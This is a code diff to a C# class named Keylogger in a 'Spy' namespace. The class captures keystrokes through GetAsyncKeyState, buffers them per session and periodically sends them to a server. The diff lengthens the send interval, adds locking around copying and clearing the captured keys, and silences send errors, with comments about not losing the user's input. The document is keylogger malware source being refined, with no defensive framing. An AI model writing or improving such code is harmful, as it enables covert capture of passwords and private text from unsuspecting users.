@@ -17,19 +17,22 @@ namespace HIT.Desktop.Spy
         [DllImport("user32.dll")]
         private static extern int GetAsyncKeyState(Int32 i);
 
+        private static object syncLock = new object();
+
         private readonly string SessionId;
-        private bool isRunning;
-        private List<string> keysPressedList;
         private readonly Timer timer;
 
+        private bool isRunning = true;
+        private int extraBufferSize = 5;
+        private List<string> keysPressedList;
+        
         public Keylogger(string sessionId)
         {
             this.SessionId = sessionId;
-            this.isRunning = true;
             this.keysPressedList = new List<string>();
 
             var dueTime = 2000;
-            var period = 2000;
+            var period = 10000;
             this.timer = new Timer(async (obj) => { await this.TimerEventHandler(); }, null, dueTime, period);
         }
 
@@ -64,14 +67,12 @@ namespace HIT.Desktop.Spy
             await this.SendKeysPressedAsync(this.keysPressedList);
         }
 
-        private IList<string> GetDeepCopy(IList<string> list)
+        private IList<string> CopyList(IList<string> list)
         {
-            var clonedList = new List<string>(list.Count);
-
+            var clonedList = new List<string>(list.Count + this.extraBufferSize);
             for (int i = 0; i < list.Count; i++)
             {
-                var clonedItem = String.Copy(list[i]);
-                clonedList.Add(clonedItem);
+                clonedList.Add(string.Copy(list[i]));
             }
 
             return clonedList;
@@ -81,17 +82,31 @@ namespace HIT.Desktop.Spy
         {
             if (this.keysPressedList.IsNotNull() && this.keysPressedList.Count > 0)
             {
-                var keysToSend = this.GetDeepCopy(this.keysPressedList);
-                this.keysPressedList.Clear();
+                // TODO: Not perfect, still has a chance of losing  
+                // some of the keys pressed (while the list is being copied and cleared after that), 
+                // yet the best solution at this moment
 
-                // REDO THIS CODE, doesnt throw exception, must check what happends
+                // Potential solution might be to use a lock on the keysPressedList object, so that the keylogger
+                // wont be able to modify its contents, but this will lead to a waiting state on the thread
+                // and we will still miss some of the user input
+                IList<string> keysToSend;
+                lock (syncLock)
+                {
+                    keysToSend = this.CopyList(this.keysPressedList);
+                    // Between the execution of these commands, a key press might be added to the original list
+                    // in which case it will not be sent to the server, because we are clearing the original list
+                    this.keysPressedList.Clear();
+                }
+                // A way to solve the problem with missing keys is to send the whole list everytime
+                // but this will have a huge impact on performance and will lead to memory leaks 
+                
                 try
                 {
                     await this.SendKeysPressedAsync(keysToSend);
                 }
                 catch (Exception e)
                 {
-                    throw;
+                    // log the exception cause
                 }
             }
         }
